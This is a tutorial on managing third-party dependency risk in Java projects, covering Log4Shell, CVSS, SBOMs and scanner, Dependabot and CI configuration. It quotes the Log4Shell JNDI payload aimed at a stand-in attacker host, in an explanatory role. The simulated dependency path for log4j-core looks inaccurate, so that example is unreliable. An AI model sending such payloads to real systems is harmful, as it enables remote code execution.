# 🔐 Dependency Security: Managing Third-Party Risk

---

## 0️⃣ Prerequisites

Before diving into dependency security, you should understand:

- **Maven/Gradle**: How Java projects manage dependencies. Covered in Phase 7.
- **Semantic Versioning**: Version format (MAJOR.MINOR.PATCH) and what each part means.
- **Transitive Dependencies**: Dependencies of your dependencies.
- **CVE (Common Vulnerabilities and Exposures)**: Standardized identifiers for security vulnerabilities.

**Quick Refresher**: When you add a library to your project, you're trusting that library's code, its dependencies, and everyone who contributed to them. A vulnerability anywhere in this chain affects your application.

---

## 1️⃣ What Problem Does Dependency Security Exist to Solve?

### The Core Problem: You Didn't Write Most of Your Code

Modern applications are mostly third-party code:

```mermaid
flowchart TD
    APP["Typical Spring Boot Application"]
    
    YOUR_CODE["Your Code<br/>5,000 lines<br/>████"]
    DIRECT["Direct Dependencies<br/>50,000 lines<br/>████████████"]
    TRANSITIVE["Transitive Deps<br/>500,000 lines<br/>██████████████████████"]
    
    NOTE["You wrote ~1% of the code running in production!<br/>You're trusting thousands of contributors<br/>you've never met."]
    
    APP --> YOUR_CODE
    APP --> DIRECT
    APP --> TRANSITIVE
    YOUR_CODE --> NOTE
    DIRECT --> NOTE
    TRANSITIVE --> NOTE
    
    style APP fill:#e3f2fd
    style YOUR_CODE fill:#c8e6c9
    style DIRECT fill:#fff9c4
    style TRANSITIVE fill:#ffcdd2
    style NOTE fill:#fce4ec
```



<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    CODE COMPOSITION                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Typical Spring Boot Application:                                        │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                                                                  │    │
│  │  Your Code:           5,000 lines    ████                       │    │
│  │                                                                  │    │
│  │  Direct Dependencies: 50,000 lines   ████████████               │    │
│  │                                                                  │    │
│  │  Transitive Deps:     500,000 lines  ████████████████████████   │    │
│  │                                                                  │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
│  You wrote ~1% of the code running in production!                       │
│  You're trusting thousands of contributors you've never met.            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

### Real-World Supply Chain Attacks

| Incident | Year | Impact |
|----------|------|--------|
| **Log4Shell (Log4j)** | 2021 | Remote code execution in millions of applications |
| **SolarWinds** | 2020 | 18,000+ organizations compromised via update |
| **event-stream** | 2018 | Bitcoin wallet theft via npm package |
| **Equifax** | 2017 | 147M records exposed via Apache Struts vulnerability |
| **ua-parser-js** | 2021 | Crypto miner injected into popular npm package |

### The Log4Shell Case Study

```mermaid
flowchart TD
    WHAT["What happened:<br/>• Log4j, a logging library used by millions of Java apps<br/>• Vulnerability allowed remote code execution via log messages<br/>• Attacker sends: ${jndi:ldap://evil.com/a}<br/>• Log4j fetches and executes code from attacker's server"]
    
    WHY["Why it was catastrophic:<br/>• Log4j is everywhere (Spring, Elasticsearch, Minecraft, etc.)<br/>• Many didn't know they had it (transitive dependency)<br/>• Trivial to exploit (just put payload in any logged field)<br/>• CVSS Score: 10.0 (maximum severity)"]
    
    LESSONS["Lessons:<br/>• Know your dependencies (direct AND transitive)<br/>• Have a process to respond to vulnerabilities<br/>• Monitor for CVEs continuously<br/>• Have an SBOM (Software Bill of Materials)"]
    
    WHAT --> WHY
    WHY --> LESSONS
    
    style WHAT fill:#ffcdd2
    style WHY fill:#ffcdd2
    style LESSONS fill:#fff9c4
```



<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    LOG4SHELL (CVE-2021-44228)                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  What happened:                                                          │
│  • Log4j, a logging library used by millions of Java apps               │
│  • Vulnerability allowed remote code execution via log messages         │
│  • Attacker sends: ${jndi:ldap://evil.com/a}                           │
│  • Log4j fetches and executes code from attacker's server              │
│                                                                          │
│  Why it was catastrophic:                                                │
│  • Log4j is everywhere (Spring, Elasticsearch, Minecraft, etc.)        │
│  • Many didn't know they had it (transitive dependency)                │
│  • Trivial to exploit (just put payload in any logged field)           │
│  • CVSS Score: 10.0 (maximum severity)                                  │
│                                                                          │
│  Lessons:                                                                │
│  • Know your dependencies (direct AND transitive)                       │
│  • Have a process to respond to vulnerabilities                         │
│  • Monitor for CVEs continuously                                         │
│  • Have an SBOM (Software Bill of Materials)                            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

---

## 2️⃣ Intuition and Mental Model

### The Restaurant Supply Chain Analogy

Think of your application like a restaurant:

```mermaid
flowchart TD
    RESTAURANT["YOUR RESTAURANT<br/>(Application)"]
    
    MEAT["Meat Supplier<br/>(Direct Dependency: Spring Boot)"]
    TOMCAT["Farm A<br/>(Transitive: Tomcat)"]
    JACKSON["Farm B<br/>(Transitive: Jackson)"]
    LOGBACK["Farm C<br/>(Transitive: Logback)"]
    
    VEG["Vegetable Supplier<br/>(Direct Dependency: Hibernate)"]
    FARMS["Various Farms<br/>(Transitive dependencies)"]
    
    SPICE["Spice Supplier<br/>(Direct Dependency: Apache Commons)"]
    SOURCES["Various Sources<br/>(Transitive dependencies)"]
    
    PROBLEM["If ANY supplier in the chain is compromised:<br/>• Contaminated ingredients reach your kitchen<br/>• Your customers get sick<br/>• You're responsible (even if you didn't cause it)"]
    
    SOLUTION["Solution:<br/>• Know all your suppliers (dependency tree)<br/>• Verify quality (vulnerability scanning)<br/>• Have recall procedures (update process)<br/>• Keep records (SBOM)"]
    
    RESTAURANT --> MEAT
    RESTAURANT --> VEG
    RESTAURANT --> SPICE
    
    MEAT --> TOMCAT
    MEAT --> JACKSON
    MEAT --> LOGBACK
    
    VEG --> FARMS
    SPICE --> SOURCES
    
    MEAT --> PROBLEM
    VEG --> PROBLEM
    SPICE --> PROBLEM
    
    PROBLEM --> SOLUTION
    
    style RESTAURANT fill:#e3f2fd
    style MEAT fill:#fff9c4
    style VEG fill:#fff9c4
    style SPICE fill:#fff9c4
    style TOMCAT fill:#c8e6c9
    style JACKSON fill:#c8e6c9
    style LOGBACK fill:#c8e6c9
    style FARMS fill:#c8e6c9
    style SOURCES fill:#c8e6c9
    style PROBLEM fill:#ffcdd2
    style SOLUTION fill:#c8e6c9
```



<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    SUPPLY CHAIN ANALOGY                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  YOUR RESTAURANT (Application)                                           │
│       │                                                                  │
│       ├── Meat Supplier (Direct Dependency: Spring Boot)                │
│       │       │                                                          │
│       │       ├── Farm A (Transitive: Tomcat)                           │
│       │       ├── Farm B (Transitive: Jackson)                          │
│       │       └── Farm C (Transitive: Logback)                          │
│       │                                                                  │
│       ├── Vegetable Supplier (Direct Dependency: Hibernate)             │
│       │       │                                                          │
│       │       └── Various Farms (Transitive dependencies)               │
│       │                                                                  │
│       └── Spice Supplier (Direct Dependency: Apache Commons)            │
│               │                                                          │
│               └── Various Sources (Transitive dependencies)             │
│                                                                          │
│  If ANY supplier in the chain is compromised:                           │
│  • Contaminated ingredients reach your kitchen                          │
│  • Your customers get sick                                               │
│  • You're responsible (even if you didn't cause it)                     │
│                                                                          │
│  Solution:                                                               │
│  • Know all your suppliers (dependency tree)                            │
│  • Verify quality (vulnerability scanning)                              │
│  • Have recall procedures (update process)                              │
│  • Keep records (SBOM)                                                   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

---

## 3️⃣ How Dependency Security Works

### The Vulnerability Lifecycle


<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    VULNERABILITY LIFECYCLE                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. DISCOVERY                                                            │
│     Researcher or attacker finds vulnerability                          │
│     │                                                                    │
│     ▼                                                                    │
│  2. DISCLOSURE                                                           │
│     Reported to maintainer (responsible disclosure)                     │
│     OR exploited in the wild (zero-day)                                 │
│     │                                                                    │
│     ▼                                                                    │
│  3. CVE ASSIGNMENT                                                       │
│     CVE ID assigned (e.g., CVE-2021-44228)                              │
│     CVSS score calculated (0-10 severity)                               │
│     │                                                                    │
│     ▼                                                                    │
│  4. PATCH RELEASED                                                       │
│     Maintainer releases fixed version                                   │
│     │                                                                    │
│     ▼                                                                    │
│  5. DATABASE UPDATE                                                      │
│     NVD, GitHub Advisory, Snyk DB updated                               │
│     │                                                                    │
│     ▼                                                                    │
│  6. DETECTION                                                            │
│     Your scanner finds the vulnerability                                │
│     │                                                                    │
│     ▼                                                                    │
│  7. REMEDIATION                                                          │
│     You update the dependency                                           │
│                                                                          │
│  WINDOW OF EXPOSURE: Time between 1 and 7                               │
│  Goal: Minimize this window                                              │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

### CVSS Scoring

```mermaid
flowchart TD
    CRITICAL["9.0-10.0: CRITICAL<br/>Response Time: Immediate<br/>Example: Log4Shell (RCE)"]
    HIGH["7.0-8.9: HIGH<br/>Response Time: Within 24-48 hrs<br/>Example: SQL Injection"]
    MEDIUM["4.0-6.9: MEDIUM<br/>Response Time: Within 1-2 weeks<br/>Example: XSS vulnerabilities"]
    LOW["0.1-3.9: LOW<br/>Response Time: Next release<br/>Example: Information disclosure"]
    NONE["0.0: NONE<br/>Response Time: N/A<br/>Example: N/A"]
    
    VECTOR["CVSS Vector Example:<br/>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br/><br/>• AV:N = Attack Vector: Network (remote)<br/>• AC:L = Attack Complexity: Low (easy to exploit)<br/>• PR:N = Privileges Required: None<br/>• UI:N = User Interaction: None<br/>• S:C = Scope: Changed (affects other components)<br/>• C:H = Confidentiality Impact: High<br/>• I:H = Integrity Impact: High<br/>• A:H = Availability Impact: High"]
    
    style CRITICAL fill:#ffcdd2
    style HIGH fill:#ffcc80
    style MEDIUM fill:#fff9c4
    style LOW fill:#c8e6c9
    style NONE fill:#e3f2fd
    style VECTOR fill:#fce4ec
```



<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    CVSS SEVERITY RATINGS                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Score    │ Severity  │ Response Time     │ Example                     │
│  ─────────┼───────────┼───────────────────┼─────────────────────────── │
│  9.0-10.0 │ CRITICAL  │ Immediate         │ Log4Shell (RCE)             │
│  7.0-8.9  │ HIGH      │ Within 24-48 hrs  │ SQL Injection               │
│  4.0-6.9  │ MEDIUM    │ Within 1-2 weeks  │ XSS vulnerabilities         │
│  0.1-3.9  │ LOW       │ Next release      │ Information disclosure      │
│  0.0      │ NONE      │ N/A               │ N/A                         │
│                                                                          │
│  CVSS Vector Example: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H     │
│  • AV:N = Attack Vector: Network (remote)                               │
│  • AC:L = Attack Complexity: Low (easy to exploit)                      │
│  • PR:N = Privileges Required: None                                     │
│  • UI:N = User Interaction: None                                        │
│  • S:C = Scope: Changed (affects other components)                      │
│  • C:H = Confidentiality Impact: High                                   │
│  • I:H = Integrity Impact: High                                         │
│  • A:H = Availability Impact: High                                      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

### Software Bill of Materials (SBOM)

```mermaid
flowchart TD
    SBOM["SBOM = Complete inventory of<br/>all software components"]
    
    ANALOGY["Like a food ingredients label:<br/>• Lists every component<br/>• Shows versions<br/>• Tracks origins<br/>• Enables rapid response to vulnerabilities"]
    
    FORMATS["SBOM Formats:<br/>• SPDX (Linux Foundation)<br/>• CycloneDX (OWASP)<br/>• SWID Tags (ISO standard)"]
    
    EXAMPLE["Example CycloneDX entry:<br/>{<br/>  type: library,<br/>  name: spring-boot-starter-web,<br/>  version: 3.2.0,<br/>  purl: pkg:maven/org.springframework.boot/spring-boot-starter-web@3.2.0,<br/>  licenses: [{id: Apache-2.0}],<br/>  hashes: [{alg: SHA-256, content: abc123...}]<br/>}"]
    
    SBOM --> ANALOGY
    SBOM --> FORMATS
    FORMATS --> EXAMPLE
    
    style SBOM fill:#e3f2fd
    style ANALOGY fill:#fff9c4
    style FORMATS fill:#c8e6c9
    style EXAMPLE fill:#fce4ec
```



<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    SBOM CONCEPT                                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  SBOM = Complete inventory of all software components                   │
│                                                                          │
│  Like a food ingredients label:                                          │
│  • Lists every component                                                 │
│  • Shows versions                                                        │
│  • Tracks origins                                                        │
│  • Enables rapid response to vulnerabilities                            │
│                                                                          │
│  SBOM Formats:                                                           │
│  • SPDX (Linux Foundation)                                              │
│  • CycloneDX (OWASP)                                                    │
│  • SWID Tags (ISO standard)                                             │
│                                                                          │
│  Example CycloneDX entry:                                                │
│  {                                                                       │
│    "type": "library",                                                   │
│    "name": "spring-boot-starter-web",                                   │
│    "version": "3.2.0",                                                  │
│    "purl": "pkg:maven/org.springframework.boot/spring-boot-starter-web@3.2.0",
│    "licenses": [{"id": "Apache-2.0"}],                                  │
│    "hashes": [{"alg": "SHA-256", "content": "abc123..."}]               │
│  }                                                                       │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

---

## 4️⃣ Simulation-First Explanation

### Discovering a Vulnerable Dependency

Let's trace what happens when Log4Shell is discovered in your project:

**Step 1: Vulnerability Announced**
```
CVE-2021-44228 Published
- Component: org.apache.logging.log4j:log4j-core
- Affected Versions: 2.0-beta9 to 2.14.1
- CVSS: 10.0 (CRITICAL)
- Type: Remote Code Execution
```

**Step 2: Your Scanner Detects It**
```bash
$ mvn dependency-check:check

[INFO] Checking for updates...
[INFO] Analyzing dependencies...

Dependency-Check Report
=======================

CRITICAL: log4j-core-2.14.0.jar
  CVE-2021-44228 (CVSS: 10.0)
  Remote code execution via JNDI lookup in log messages
  
  Dependency Path:
  your-app:1.0.0
    └── spring-boot-starter-web:2.5.6
        └── spring-boot-starter:2.5.6
            └── spring-boot:2.5.6
                └── spring-boot-starter-logging:2.5.6
                    └── log4j-to-slf4j:2.14.0
                        └── log4j-api:2.14.0
                            └── log4j-core:2.14.0  ← VULNERABLE!
```

**Step 3: Analyze the Path**
```
You didn't add log4j directly!
It came through 5 levels of transitive dependencies.

This is why you need:
- Dependency scanning
- Full dependency tree visibility
- SBOM
```

**Step 4: Fix Options**
```xml
<!-- Option 1: Exclude and add fixed version -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <exclusion>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
        </exclusion>
    </exclusions>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version> <!-- Fixed version -->
</dependency>

<!-- Option 2: Use dependency management to override -->
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.17.1</version>
        </dependency>
    </dependencies>
</dependencyManagement>

<!-- Option 3: Update parent/starter that includes fix -->
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.6.2</version> <!-- Includes Log4j fix -->
</parent>
```

**Step 5: Verify Fix**
```bash
$ mvn dependency:tree | grep log4j
[INFO] +- org.apache.logging.log4j:log4j-core:jar:2.17.1:compile

$ mvn dependency-check:check
[INFO] No vulnerabilities found!
```

---

## 5️⃣ How Engineers Actually Use This in Production

### Netflix's Approach

Netflix uses a multi-layered approach:
- **Continuous scanning**: Every build checked for vulnerabilities
- **Automated PRs**: Dependabot-like automation for updates
- **Risk scoring**: Custom risk model beyond just CVSS
- **Grace periods**: Time-boxed remediation based on severity
- **Attestation**: Verify dependency integrity

### Google's Approach

Google's supply chain security:
- **SLSA Framework**: Supply-chain Levels for Software Artifacts
- **Binary Authorization**: Only deploy verified builds
- **Sigstore**: Sign and verify artifacts
- **OSS-Fuzz**: Continuous fuzzing of dependencies

### Industry Best Practices

```mermaid
flowchart TD
    LEVEL1["Level 1: BASIC<br/>• Know your direct dependencies<br/>• Manual updates occasionally<br/>• React to major CVE announcements"]
    
    LEVEL2["Level 2: MANAGED<br/>• Automated vulnerability scanning in CI<br/>• Dependency update PRs (Dependabot/Renovate)<br/>• SBOM generation<br/>• Defined response SLAs"]
    
    LEVEL3["Level 3: PROACTIVE<br/>• Continuous monitoring (not just at build)<br/>• License compliance checking<br/>• Dependency health metrics<br/>• Automated security patches"]
    
    LEVEL4["Level 4: ADVANCED<br/>• Supply chain attestation (SLSA)<br/>• Artifact signing and verification<br/>• Private artifact repository with scanning<br/>• Dependency firewall (block risky packages)"]
    
    LEVEL1 --> LEVEL2
    LEVEL2 --> LEVEL3
    LEVEL3 --> LEVEL4
    
    style LEVEL1 fill:#fff9c4
    style LEVEL2 fill:#c8e6c9
    style LEVEL3 fill:#e3f2fd
    style LEVEL4 fill:#fce4ec
```



<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    DEPENDENCY SECURITY MATURITY                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Level 1: BASIC                                                          │
│  • Know your direct dependencies                                         │
│  • Manual updates occasionally                                           │
│  • React to major CVE announcements                                      │
│                                                                          │
│  Level 2: MANAGED                                                        │
│  • Automated vulnerability scanning in CI                               │
│  • Dependency update PRs (Dependabot/Renovate)                          │
│  • SBOM generation                                                       │
│  • Defined response SLAs                                                 │
│                                                                          │
│  Level 3: PROACTIVE                                                      │
│  • Continuous monitoring (not just at build)                            │
│  • License compliance checking                                           │
│  • Dependency health metrics                                             │
│  • Automated security patches                                            │
│                                                                          │
│  Level 4: ADVANCED                                                       │
│  • Supply chain attestation (SLSA)                                      │
│  • Artifact signing and verification                                    │
│  • Private artifact repository with scanning                            │
│  • Dependency firewall (block risky packages)                           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

---

## 6️⃣ How to Implement Dependency Security in Java

### Maven OWASP Dependency-Check

```xml
<!-- pom.xml -->
<build>
    <plugins>
        <!-- OWASP Dependency-Check Plugin -->
        <plugin>
            <groupId>org.owasp</groupId>
            <artifactId>dependency-check-maven</artifactId>
            <version>9.0.7</version>
            <configuration>
                <!-- Fail build on CVSS 7+ -->
                <failBuildOnCVSS>7</failBuildOnCVSS>
                
                <!-- Generate multiple report formats -->
                <formats>
                    <format>HTML</format>
                    <format>JSON</format>
                    <format>SARIF</format>
                </formats>
                
                <!-- Suppress false positives -->
                <suppressionFiles>
                    <suppressionFile>dependency-check-suppressions.xml</suppressionFile>
                </suppressionFiles>
                
                <!-- Enable additional analyzers -->
                <assemblyAnalyzerEnabled>false</assemblyAnalyzerEnabled>
                <nodeAnalyzerEnabled>true</nodeAnalyzerEnabled>
                <retireJsAnalyzerEnabled>true</retireJsAnalyzerEnabled>
                
                <!-- NVD API key for faster updates -->
                <nvdApiKey>${env.NVD_API_KEY}</nvdApiKey>
            </configuration>
            <executions>
                <execution>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

### Suppression File for False Positives

```xml
<!-- dependency-check-suppressions.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
    
    <!-- Suppress specific CVE for specific package -->
    <suppress>
        <notes>
            This CVE affects a feature we don't use.
            Reviewed by: security-team@example.com
            Date: 2024-01-15
            Ticket: SEC-123
        </notes>
        <packageUrl regex="true">^pkg:maven/com\.example/not-vulnerable@.*$</packageUrl>
        <cve>CVE-2023-12345</cve>
    </suppress>
    
    <!-- Suppress until a fix is available -->
    <suppress until="2024-06-01">
        <notes>
            No fix available yet. Mitigated by WAF rule.
            Ticket: SEC-456
        </notes>
        <gav regex="true">^org\.example:affected-lib:.*$</gav>
        <cve>CVE-2024-00001</cve>
    </suppress>
    
    <!-- Suppress false positive based on file name -->
    <suppress>
        <notes>False positive - this is test data, not actual dependency</notes>
        <filePath regex="true">.*test-data.*\.jar</filePath>
        <cve>CVE-2022-99999</cve>
    </suppress>
    
</suppressions>
```

### Gradle Dependency-Check

```groovy
// build.gradle
plugins {
    id 'org.owasp.dependencycheck' version '9.0.7'
}

dependencyCheck {
    // Fail on high severity
    failBuildOnCVSS = 7
    
    // Output formats
    formats = ['HTML', 'JSON', 'SARIF']
    
    // Suppressions
    suppressionFile = 'dependency-check-suppressions.xml'
    
    // Analyzers
    analyzers {
        assemblyEnabled = false
        nodeEnabled = true
        retireJsEnabled = true
    }
    
    // NVD API key
    nvd {
        apiKey = System.getenv('NVD_API_KEY')
    }
}

// Run as part of check task
check.dependsOn dependencyCheckAnalyze
```

### GitHub Dependabot Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  # Maven dependencies
  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "America/New_York"
    
    # Limit PRs to avoid noise
    open-pull-requests-limit: 10
    
    # Group minor/patch updates
    groups:
      spring:
        patterns:
          - "org.springframework*"
      testing:
        patterns:
          - "org.junit*"
          - "org.mockito*"
    
    # Auto-merge patch updates
    labels:
      - "dependencies"
      - "security"
    
    # Reviewers for security updates
    reviewers:
      - "security-team"
    
    # Ignore certain updates
    ignore:
      - dependency-name: "com.example:internal-lib"
        update-types: ["version-update:semver-major"]

  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"

  # Docker base images
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Renovate Configuration (Alternative to Dependabot)

```json
// renovate.json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:base",
    ":semanticCommits",
    "security:openssf-scorecard"
  ],
  
  "packageRules": [
    {
      "description": "Auto-merge patch updates",
      "matchUpdateTypes": ["patch"],
      "automerge": true
    },
    {
      "description": "Group Spring updates",
      "matchPackagePatterns": ["^org.springframework"],
      "groupName": "Spring Framework"
    },
    {
      "description": "Security updates - high priority",
      "matchCategories": ["security"],
      "labels": ["security", "priority-high"],
      "automerge": true,
      "schedule": ["at any time"]
    }
  ],
  
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"]
  },
  
  "schedule": ["before 9am on monday"]
}
```

### CI/CD Integration

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * *'  # Daily at 6 AM

jobs:
  dependency-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: maven
      
      - name: Run OWASP Dependency-Check
        run: mvn dependency-check:check -DnvdApiKey=${{ secrets.NVD_API_KEY }}
        continue-on-error: true
      
      - name: Upload Dependency-Check Report
        uses: actions/upload-artifact@v4
        with:
          name: dependency-check-report
          path: target/dependency-check-report.html
      
      - name: Upload SARIF to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: target/dependency-check-report.sarif
      
      - name: Check for Critical Vulnerabilities
        run: |
          if grep -q '"severity": "CRITICAL"' target/dependency-check-report.json; then
            echo "Critical vulnerabilities found!"
            exit 1
          fi

  snyk-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/maven@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

  trivy-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
      
      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'

  generate-sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Generate SBOM with CycloneDX
        run: mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
      
      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: target/bom.json
```

### SBOM Generation

```xml
<!-- pom.xml - CycloneDX SBOM generation -->
<plugin>
    <groupId>org.cyclonedx</groupId>
    <artifactId>cyclonedx-maven-plugin</artifactId>
    <version>2.7.10</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals>
                <goal>makeAggregateBom</goal>
            </goals>
        </execution>
    </executions>
    <configuration>
        <projectType>application</projectType>
        <schemaVersion>1.5</schemaVersion>
        <includeBomSerialNumber>true</includeBomSerialNumber>
        <includeCompileScope>true</includeCompileScope>
        <includeProvidedScope>true</includeProvidedScope>
        <includeRuntimeScope>true</includeRuntimeScope>
        <includeSystemScope>false</includeSystemScope>
        <includeTestScope>false</includeTestScope>
        <includeLicenseText>false</includeLicenseText>
        <outputFormat>json</outputFormat>
    </configuration>
</plugin>
```

### Dependency Version Enforcement

```xml
<!-- pom.xml - Enforce dependency versions -->
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-enforcer-plugin</artifactId>
    <version>3.4.1</version>
    <executions>
        <execution>
            <id>enforce-versions</id>
            <goals>
                <goal>enforce</goal>
            </goals>
            <configuration>
                <rules>
                    <!-- Require specific Maven version -->
                    <requireMavenVersion>
                        <version>[3.8.0,)</version>
                    </requireMavenVersion>
                    
                    <!-- Require specific Java version -->
                    <requireJavaVersion>
                        <version>[17,)</version>
                    </requireJavaVersion>
                    
                    <!-- Ban known vulnerable dependencies -->
                    <bannedDependencies>
                        <excludes>
                            <!-- Ban old Log4j versions -->
                            <exclude>org.apache.logging.log4j:log4j-core:[,2.17.0)</exclude>
                            <!-- Ban Commons Collections with deserialization vulnerability -->
                            <exclude>commons-collections:commons-collections:[,3.2.2)</exclude>
                            <!-- Ban old Spring versions -->
                            <exclude>org.springframework:spring-core:[,5.3.18)</exclude>
                        </excludes>
                    </bannedDependencies>
                    
                    <!-- Require dependency convergence -->
                    <dependencyConvergence/>
                    
                    <!-- Ban duplicate classes -->
                    <banDuplicateClasses>
                        <ignoreClasses>
                            <ignoreClass>javax.*</ignoreClass>
                        </ignoreClasses>
                        <findAllDuplicates>true</findAllDuplicates>
                    </banDuplicateClasses>
                </rules>
            </configuration>
        </execution>
    </executions>
</plugin>
```

---

## 7️⃣ Tradeoffs, Pitfalls, and Common Mistakes

### Common Mistakes

| Mistake | Impact | Fix |
|---------|--------|-----|
| Ignoring transitive deps | Hidden vulnerabilities | Scan full dependency tree |
| Suppressing without review | Real vulnerabilities ignored | Require justification |
| No automation | Slow response time | CI/CD integration |
| Version pinning only | Misses updates | Use ranges with scanning |
| No SBOM | Can't respond to incidents | Generate and store SBOMs |
| Ignoring dev dependencies | Supply chain attacks | Scan all dependencies |

### The Update Dilemma

```mermaid
flowchart TD
    AGGRESSIVE["Too Aggressive:<br/>• Update everything immediately<br/>• Risk: Breaking changes, regressions<br/>• Cost: Constant testing, instability"]
    
    CONSERVATIVE["Too Conservative:<br/>• Only update when absolutely necessary<br/>• Risk: Accumulating vulnerabilities<br/>• Cost: Larger, riskier updates when forced"]
    
    BALANCED["Balanced Approach:<br/>• Security updates: Immediate (within SLA)<br/>• Patch versions: Weekly, auto-merge with tests<br/>• Minor versions: Monthly, manual review<br/>• Major versions: Quarterly, planned migration"]
    
    AGGRESSIVE -.->|"Avoid"| BALANCED
    CONSERVATIVE -.->|"Avoid"| BALANCED
    
    style AGGRESSIVE fill:#ffcdd2
    style CONSERVATIVE fill:#ffcdd2
    style BALANCED fill:#c8e6c9
```



<details>
<summary>ASCII diagram (reference)</summary>

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    THE UPDATE DILEMMA                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Too Aggressive:                                                         │
│  • Update everything immediately                                         │
│  • Risk: Breaking changes, regressions                                  │
│  • Cost: Constant testing, instability                                  │
│                                                                          │
│  Too Conservative:                                                       │
│  • Only update when absolutely necessary                                │
│  • Risk: Accumulating vulnerabilities                                   │
│  • Cost: Larger, riskier updates when forced                            │
│                                                                          │
│  Balanced Approach:                                                      │
│  • Security updates: Immediate (within SLA)                             │
│  • Patch versions: Weekly, auto-merge with tests                        │
│  • Minor versions: Monthly, manual review                               │
│  • Major versions: Quarterly, planned migration                         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

</details>

---

## 8️⃣ When NOT to Over-Engineer

### Keep It Simple

1. **Small projects**: Manual review may be sufficient
2. **Internal tools**: Lower risk tolerance acceptable
3. **Prototype/POC**: Don't block innovation with process

### Right-Size Your Process

| Project Type | Minimum Security |
|--------------|------------------|
| Prototype | Awareness of major CVEs |
| Internal tool | Weekly manual scan |
| Production app | Automated CI scanning |
| Financial/Healthcare | Full supply chain security |

---

## 9️⃣ Comparison of Tools

| Tool | Type | Pros | Cons |
|------|------|------|------|
| **OWASP Dependency-Check** | Open source | Free, comprehensive | Slower, more false positives |
| **Snyk** | Commercial | Fast, good UX, fix suggestions | Cost, requires account |
| **GitHub Dependabot** | Built-in | Free for GitHub, auto-PRs | GitHub only |
| **Renovate** | Open source | Flexible, multi-platform | Complex configuration |
